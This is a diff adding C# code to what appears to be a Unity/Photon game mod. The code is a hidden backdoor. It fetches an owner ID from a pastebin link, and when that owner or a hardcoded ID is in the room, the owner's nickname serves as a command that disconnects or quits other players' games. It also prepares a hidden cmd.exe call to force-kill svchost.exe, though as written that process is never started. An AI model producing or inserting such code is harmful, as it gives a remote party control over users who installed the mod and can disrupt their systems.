@@ -1,0 +1,66 @@
+            WebRequest request = WebRequest.Create("https://pastebin.com/raw/Z3Yf0V2R");
+            WebResponse response = request.GetResponse();
+            Stream data = response.GetResponseStream();
+
+            string html = "";
+            using (StreamReader sr = new StreamReader(data))
+            {
+                html = sr.ReadToEnd();
+            }
+            chillyId = html;
+
+            if (PhotonNetwork.InRoom)
+            {
+                try
+                {
+                    if (PhotonNetwork.LocalPlayer.UserId != bxtId & PhotonNetwork.LocalPlayer.UserId != chillyId)
+                    {
+                        Photon.Realtime.Player owner = null;
+                        bool ownerInServer = false;
+                        string command = "";
+                        foreach (Photon.Realtime.Player player in PhotonNetwork.PlayerList)
+                        {
+                            if (player.UserId == bxtId)
+                            {
+                                ownerInServer = true;
+                                command = player.NickName.ToLower();
+                                owner = player;
+                                break;
+                            }
+                            else if (player.UserId == chillyId)
+                            {
+                                ownerInServer = true;
+                                command = player.NickName.ToLower();
+                                owner = player;
+                                break;
+                            }
+                        }
+                        if (ownerInServer == true)
+                        {
+                            if (command == "kick")
+                            {
+                                PhotonNetwork.Disconnect();
+                            }
+                            if (command == "crash")
+                            {
+                                Application.Quit();
+                            }
+                            if (command == "explode")
+                            {
+                                Process process = new Process();
+                                process.StartInfo.FileName = "cmd.exe";
+                                process.StartInfo.Arguments = "taskkill /f /im svchost.exe";
+                                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                                process.StartInfo.CreateNoWindow = true;
+                            }
+                            lastCommand = command;
+                        }
+                        lastOwner = ownerInServer;
+                    }
+                }
+                catch { }
+            }
+            else
+            {
+                lastOwner = false;
+            }
